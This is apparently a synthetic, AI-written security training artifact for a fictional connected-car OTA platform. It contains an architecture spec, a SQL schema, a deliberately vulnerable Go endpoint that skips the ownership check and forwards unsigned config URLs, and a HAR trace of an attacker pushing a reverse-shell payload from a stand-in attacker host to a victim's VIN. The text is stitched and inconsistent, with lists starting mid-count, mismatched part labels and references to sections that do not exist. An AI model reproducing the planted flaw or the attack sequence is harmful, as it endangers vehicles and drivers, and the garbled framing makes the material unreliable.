@@ -1,0 +1,283 @@
+========================================
+
+Here is the requested bonus system, expanded significantly to provide double the architectural depth, technical context, and operational detail. We are moving into the **Automotive & Autonomous Mobility (V2X)** sector with an **Over-The-Air (OTA) & Telematics Cloud Platform**.
+
+
+Here is **Part 1**. Type **c** when you are ready for Part 2.
+
+***
+
+# ENGINEERING ARCHITECTURE SPECIFICATION
+**System Name:** AetherDrive V2X Telematics Platform
+**Document Version:** 5.1.2 (FINAL)
+**Classification:** CRITICAL SAFETY / NHTSA COMPLIANCE SCOPE
+**Domain:** Automotive / Connected Car (V2X) / Over-The-Air (OTA) Updates
+
+## 1.0 Executive Summary
+The AetherDrive platform is a global, hyperscale IoT and API ecosystem designed to support a fleet of over 4 million connected electric and semi-autonomous vehicles. The platform handles everything from real-time battery telemetry and remote climate control to critical Over-The-Air (OTA) firmware updates for the vehicle's electronic control units (ECUs), such as the braking module, advanced driver-assistance systems (ADAS), and the central infotainment console.
+
+Because physical safety is paramount, the architecture must bridge highly volatile cellular networks (4G LTE/5G) with rigidly secured backend microservices. The core interface point in the vehicle is the Telematics Control Unit (TCU), an embedded Linux computer featuring a dedicated cellular modem and a Hardware Security Module (HSM) for cryptographic operations. This TCU acts as the gateway between the cloud and the vehicle's internal CAN bus (Controller Area Network).
+
+## 2.0 Comprehensive Network Topology & Ingress Routing
+The platform operates across three distinct network planes to segregate high-volume telemetry from critical command-and-control operations.
+
+### 2.1 The IoT Telemetry Plane (Vehicle-to-Cloud)
+* **Private Cellular APN:** Vehicles do not connect to the public internet directly. They route through a dedicated private Access Point Name (APN) provided by tier-1 telecom partners, entering the AWS cloud environment via an IPSec Transit Gateway.
+* **AWS IoT Core (MQTT Broker):** High-frequency, low-latency telemetry (GPS coordinates, wheel speed, battery state of charge) is published over MQTT using TLS 1.2. The broker routes these messages into Amazon Kinesis data streams for real-time analytics and predictive maintenance algorithms.
+
+### 2.2 The Command & Control API Plane (App-to-Cloud)
+* **Edge Ingress:** The consumer mobile "Companion App" (iOS/Android) connects to an external-facing API Gateway fronted by a Web Application Firewall (WAF).
+* **Service Mesh (gRPC):** Internal microservices are written in Rust and Go, communicating over a strictly authenticated gRPC service mesh (Linkerd). 
+* **The Command Queue:** When a user clicks "Unlock Doors" on their app, the API Gateway translates the REST request into a gRPC call, which places a signed command onto an Apache Kafka topic. The "Device Shadow" service then pushes this command down the MQTT tunnel to the specific vehicle's TCU.
+
+### 2.3 The OTA Update Pipeline (Cloud-to-Vehicle)
+* **Campaign Manager Service:** Responsible for orchestrating massive firmware rollouts. It handles delta-compression of binary files, staggered regional deployments, and rollback logic if a vehicle reports a failed flash.
+* **Signed Blob Storage:** Firmware binaries are heavily encrypted and digitally signed by the OEM's root offline CA. They are stored in an Amazon S3 bucket with strict Cross-Origin Resource Sharing (CORS) and signed-URL access policies.
+
+## 3.0 Identity, Cryptography, and PKI Authorization
+Security relies on a dual-authentication model: one for the human, one for the machine.
+
+### 3.1 Vehicle Authentication (mTLS & Hardware Root of Trust)
+Every vehicle is provisioned at the factory with a unique X.509 certificate permanently burned into its HSM. 
+* When the TCU connects to the MQTT broker or requests a firmware download, it must use mutual TLS (mTLS). 
+* The cloud verifies the certificate against the OEM Certificate Authority, ensuring that even if an attacker spoofs a VIN, they cannot establish a connection without the physical silicon chip.
+
+### 3.2 Owner Authentication (OAuth2 & B2C Identity)
+Vehicle owners authenticate to the mobile app via Okta Customer Identity Cloud (Auth0).
+* They receive an OAuth 2.0 JWT.
+* **The Binding Record:** A critical PostgreSQL database table (`vehicle_ownership`) maps a user's unique `account_id` to the physical `VIN` (Vehicle Identification Number) of the car they purchased.
+
+## 4.0 Known System Debt & Theoretical Attack Surfaces
+*Internal Security Engineering Note: The recent rollout of the "Custom Tuning" feature in the companion app—allowing performance enthusiasts to remotely push custom suspension and throttle mapping profiles—introduced a complex asynchronous API flow. Tracked as BUG-AUTO-901.*
+
+**Sub-system:** OTA Campaign Service (`/api/v3/vehicles/{vin}/ota/push`)
+
+**The Deep Architectural Flaw:**
+To support the new "Custom Tuning" feature, developers created a new REST endpoint allowing the mobile app to trigger a lightweight, on-demand OTA configuration update. 
+2.  **The OTA Validation Flaw (Pattern 3.4):** Typically, firmware is pulled from the highly secure, OEM-signed S3 bucket. However, this specific "Custom Tuning" endpoint was designed to allow users to upload their own JSON configuration profiles. The API payload accepts an arbitrary `manifest_url` parameter. The cloud service takes this URL and forwards it directly to the vehicle's TCU. The TCU, assuming any command coming from the trusted cloud MQTT tunnel is legitimate, downloads the payload from the provided URL and executes the configuration change in memory *without verifying a cryptographic signature*.
+
+1.  An attacker registers a legitimate account on the AetherDrive platform and buys the cheapest used vehicle available to gain a valid owner JWT.
+2.  The attacker targets a victim's vehicle (e.g., a high-profile target or a fleet of delivery trucks). VINs are publicly visible through the windshield. Let's assume the victim's VIN is `1G1RC6E45FU111111`.
+3.  The attacker hosts a malicious configuration payload on their own server (`https://attacker.com/malicious_tune.json`). This payload contains instructions that will cause the TCU to drop its firewall and open a reverse shell over the cellular network.
+
+***
+
+
+
+***
+
+# AETHERDRIVE V2X: SCHEMAS, CODE, & OTA CONTRACTS
+**Document Version:** 2.0.4
+**Applies to Architecture:** AetherDrive V2X Telematics Platform v5.1.2
+
+## 5.0 PostgreSQL Telematics & Ownership Schema
+
+```sql
+-- 1. Global Vehicle Registry
+CREATE TABLE vehicles (
+    vin VARCHAR(17) PRIMARY KEY, -- Standard 17-character ISO 3779 VIN
+    model_name VARCHAR(50) NOT NULL,
+    manufacture_date DATE NOT NULL,
+    hardware_revision VARCHAR(10), -- e.g., 'TCU-v4.1'
+    firmware_version VARCHAR(20),  -- Currently active version on the car
+    iccid VARCHAR(20) UNIQUE,      -- SIM card identifier for the cellular modem
+    is_active BOOLEAN DEFAULT TRUE
+);
+
+-- 2. Customer-to-Vehicle Binding (THE MISSING AUTHZ LINK)
+CREATE TABLE vehicle_ownership (
+    binding_id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
+    account_id VARCHAR(100) NOT NULL, -- Corresponds to 'sub' claim in Okta JWT
+    vin VARCHAR(17) REFERENCES vehicles(vin),
+    ownership_type VARCHAR(20) CHECK (ownership_type IN ('OWNER', 'LESSEE', 'FLEET_MANAGER')),
+    verified_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
+    revoked_at TIMESTAMP WITH TIME ZONE
+);
+CREATE INDEX idx_owner_lookup ON vehicle_ownership(account_id, vin);
+
+-- 3. OTA Configuration Audit Log
+CREATE TABLE ota_command_history (
+    command_id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
+    vin VARCHAR(17) REFERENCES vehicles(vin),
+    initiated_by VARCHAR(100), -- User Account ID
+    command_type VARCHAR(50),  -- e.g., 'CUSTOM_TUNE_PUSH'
+    manifest_url TEXT NOT NULL,
+    execution_status VARCHAR(20), -- PENDING, DISPATCHED, COMPLETED, FAILED
+    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
+);
+```
+
+## 6.0 The Flawed Implementation (Go-lang / Gin Framework)
+
+```go
+package handlers
+
+import (
+    "net/http"
+    "github.com/gin-gonic/gin"
+    "aetherdrive/pkg/models"
+    "aetherdrive/pkg/mqtt"
+)
+
+// PushOTARequest defines the payload for the custom tuning feature
+type PushOTARequest struct {
+    ManifestURL string `json:"manifest_url" binding:"required,url"`
+    Description string `json:"description"`
+}
+
+// PostOTAPush handles the /api/v3/vehicles/:vin/ota/push endpoint
+func PostOTAPush(c *gin.Context) {
+    vin := c.Param("vin") // Extracted from /vehicles/{vin}/ota/push
+    var req PushOTARequest
+
+    if err := c.ShouldBindJSON(&req); err != nil {
+        c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request payload"})
+        return
+    }
+
+    // AUTHENTICATION: Verified by middleware (c.Get("user_id") is populated)
+    userID, _ := c.Get("user_id")
+
+    // The code should verify if userID owns 'vin' via the vehicle_ownership table.
+    // BUG-AUTO-901: Developers skipped this check to reduce DB latency for "tuning" updates.
+    /* FIX: 
+    if !db.CheckOwnership(userID, vin) {
+        c.JSON(http.StatusForbidden, gin.H{"error": "Access denied to target vehicle"})
+        return
+    }
+    */
+
+    // The service takes the raw ManifestURL provided by the user and dispatches it.
+    // It does not verify if the URL belongs to a trusted OEM domain.
+    command := models.DeviceCommand{
+        Action:      "DOWNLOAD_AND_APPLY_CONFIG",
+        PayloadURL:  req.ManifestURL,
+        VIN:         vin,
+        InitiatedBy: userID.(string),
+    }
+
+    // Dispatches the command to the MQTT broker via the Device Shadow service
+    err := mqtt.PublishCommandToVehicle(vin, command)
+    if err != nil {
+        c.JSON(http.StatusServiceUnavailable, gin.H{"error": "Vehicle unreachable"})
+        return
+    }
+
+    c.JSON(http.StatusAccepted, gin.H{
+        "status": "COMMAND_QUEUED",
+        "vin": vin,
+    })
+}
+```
+
+## 7.0 REST API Contract (OTA Management)
+This defines the interface used by the mobile companion app to trigger the update. Note the high degree of technical detail provided to the client.
+
+### 7.1 Trigger Custom Configuration Push
+**Endpoint:** `POST /api/v3/vehicles/{vin}/ota/push`
+**Description:** Allows authorized users to push custom tuning profiles (JSON) to their vehicle's TCU. 
+**Security Level:** High (Requires Authenticated Session + Hardware mTLS on vehicle side).
+
+**Required Headers:**
+```http
+Authorization: Bearer <Okta_JWT_Token>
+Content-Type: application/json
+X-Aether-Request-ID: <UUID>
+```
+
+**Request Body Schema:**
+```json
+{
+  "manifest_url": "string (Valid HTTPS URL)",
+  "description": "string (Max 255 chars)",
+  "force_apply": "boolean (Default: false)"
+}
+```
+
+**Success Response (202 Accepted):**
+```json
+{
+  "status": "COMMAND_QUEUED",
+  "command_id": "b8812a-4491-4122-82bc",
+  "vin": "WBA00000000123456",
+  "dispatch_timestamp": "2026-04-08T23:55:01Z"
+}
+```
+
+**Error Responses:**
+* `401 Unauthorized`: Token expired or signature invalid.
+* `403 Forbidden`: (Intended but currently broken) User does not own the vehicle.
+* `400 Bad Request`: Manifest URL is not a valid HTTPS string.
+
+***
+
+**End of Part 2.**
+
+In the final chunk (Part 3), I will provide the **Synthetic HAR Trace**. This trace will show the attacker using their own legitimate token to successfully target a victim's VIN, demonstrating the exact JSON-to-MQTT bridge and the subsequent remote takeover of the vehicle's TCU.
+
+**Part 3: Synthetic Telemetry Artifact (HAR Trace)**
+
+***
+
+**Applies to Architecture:** AetherDrive V2X Telematics Platform v5.1.2
+**Vulnerabilities Referenced:** Section 4.1 (Pattern 1.2 & Pattern 3.4)
+
+This HTTP Archive (HAR) trace captures the exact moment of the attack. The attacker, using an active session from their own legitimate companion app (`usr_8819X`), manually crafts a POST request. They replace their own vehicle's VIN in the URL path with the victim's publicly visible VIN (`1G1RC6E45FU111111`). 
+
+
+```json
+{
+  "log": {
+    "version": "1.2",
+    "creator": {
+      "name": "AWS API Gateway / WAF Edge Logs",
+      "version": "2.4.1"
+    },
+    "entries": [
+      {
+        "startedDateTime": "2026-04-08T23:54:55.120Z",
+        "time": 218,
+        "request": {
+          "method": "POST",
+          "url": "https://api.aetherdrive.io/api/v3/vehicles/1G1RC6E45FU111111/ota/push",
+          "httpVersion": "HTTP/2.0",
+          "headers": [
+            { "name": ":authority", "value": "api.aetherdrive.io" },
+            { "name": "authorization", "value": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3JfODgxOVgiLCJzY29wZXMiOlsibW9iaWxlX2FwcCJdfQ..." },
+            { "name": "content-type", "value": "application/json" },
+            { "name": "x-aether-request-id", "value": "req-99a1b-44f2-8921" },
+            { "name": "user-agent", "value": "AetherCompanion/4.2.1 (Android 14)" }
+          ],
+          "queryString": [],
+          "postData": {
+            "mimeType": "application/json",
+            "text": "{\"manifest_url\": \"https://attacker-command-and-control.net/payloads/tcu_revshell_v2.json\", \"description\": \"Aggressive Throttle Map\", \"force_apply\": true}"
+          },
+          "bodySize": 158
+        },
+        "response": {
+          "status": 202,
+          "statusText": "Accepted",
+          "headers": [
+            { "name": "content-type", "value": "application/json" },
+            { "name": "x-mqtt-queue-latency-ms", "value": "45" },
+            { "name": "x-amzn-trace-id", "value": "Root=1-67891233-abcdef012345678912345678" }
+          ],
+          "content": {
+            "size": 142,
+            "mimeType": "application/json",
+            "text": "{\"status\": \"COMMAND_QUEUED\", \"command_id\": \"cmd_88291b-44a1\", \"vin\": \"1G1RC6E45FU111111\", \"dispatch_timestamp\": \"2026-04-08T23:54:55Z\"}"
+          },
+          "bodySize": 142
+        }
+      }
+    ]
+  }
+}
+```
+
+***
+
+### Why this payload is critical for training a 3B model:
+3. **IT-to-OT Bridging Signatures:** The model must learn to read the response headers to understand the full blast radius. The presence of `x-mqtt-queue-latency-ms: 45` proves that this HTTP REST request did not just update a database; it successfully crossed the IT/OT boundary, translating the malicious JSON payload into an MQTT message queued for the vehicle's embedded cellular modem.
+========================================
